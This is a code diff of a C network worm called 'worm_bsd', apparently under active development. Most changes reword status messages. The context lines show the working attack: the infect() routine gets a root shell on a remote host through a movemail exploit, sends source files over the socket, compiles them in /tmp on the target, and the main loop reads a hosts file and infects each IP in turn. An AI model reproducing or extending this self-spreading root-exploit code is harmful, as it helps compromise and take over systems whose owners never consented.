@@ -29,7 +29,7 @@ void deploy_receive_file(sock)
         }
         fclose(fp);
     }
-    printf("[*] Injected IP will be: [%s]\n", local_ip);
+    // printf("[DEBUG] Injected IP will be: [%s]\n", local_ip);
 
     formatted_source = (char *)malloc(10000); 
     if (formatted_source == (char *)0) return;
@@ -63,7 +63,6 @@ fputs(b,o);fs-=n;}fclose(o);free(fn);send_int(i,s);}break;}close(s);return 0;}";
     bzero(cmd_buf, IO_BUF_SIZE);
     read_from_sock(sock, cmd_buf, IO_BUF_SIZE);
     free(formatted_source);
-    printf("[*] File contents sent\n");
 }
 
 void infect(ip)
@@ -99,11 +98,11 @@ void infect(ip)
     write_to_sock(sock, "echo bang\n");
 
     get_root_shell_via_movemail_exploit(sock, io_buf, IO_BUF_SIZE);
-    printf("[*] Should have root shell now\n");
+    printf("[*] Root shell obtained\n");
 
     deploy_receive_file(sock);
     
-    printf("[*] Forking to create send_file process\n");
+    printf("[*] Forking to create send_file process on server\n");
 
     if (fork() == 0) {
         argv[0] = "send_file_over_socket_bsd";
@@ -115,7 +114,7 @@ void infect(ip)
         exit(1);
     }
 
-    printf("[*] Attempting to compile receive_file.c on target\n");
+    printf("[*] Compiling receive_file.c on target\n");
     write_to_sock(sock, "cd /tmp; cc receive_file.c -o receive_file\n");
     sleep(2);
     read_from_sock(sock, io_buf, IO_BUF_SIZE);
@@ -125,15 +124,14 @@ void infect(ip)
     sleep(12);
     read_from_sock(sock, io_buf, IO_BUF_SIZE);
 
-    printf("[*] DEBUG: Checking /tmp contents on target...\n");
+    printf("[*] Checking /tmp contents on target\n");
     write_to_sock(sock, "ls -l /tmp/worm_bsd*\n");
     sleep(2);
     read_from_sock(sock, io_buf, IO_BUF_SIZE);
 
-    printf("[*] Compile send_file_over_socket_bsd.c on target\n");
+    printf("[*] Compiling send_file_over_socket_bsd.c on target\n");
     write_to_sock(sock, "cd /tmp; cc send_file_over_socket_bsd.c -o send_file_over_socket_bsd\n");
     sleep(2);
-    read_from_sock(sock, io_buf, IO_BUF_SIZE);
 
     printf("[*] Compiling worm_bsd.c on target\n");
     write_to_sock(sock, "cd /tmp; rm -f worm_bsd; cc worm_bsd.c -o worm_bsd\n");
@@ -163,7 +161,7 @@ int main()
         }
         fclose(fp);
     }
-    printf("[*] Attacker IP is %s. Starting infection loop...\n", my_ip);
+    printf("[*] Attacker IP is %s. Starting infection.\n", my_ip);
 
     while (1) {
         fp = fopen(HOSTS_FILE, "r");
@@ -196,7 +194,7 @@ int main()
         }
 
         infect(ip);
-        printf(" ---- Infection Cycle completed for IP: %s ----\n", ip);
+        printf(" ---- Infection Complete for IP: %s ----\n", ip);
         sleep(10);
         
         fclose(fp);
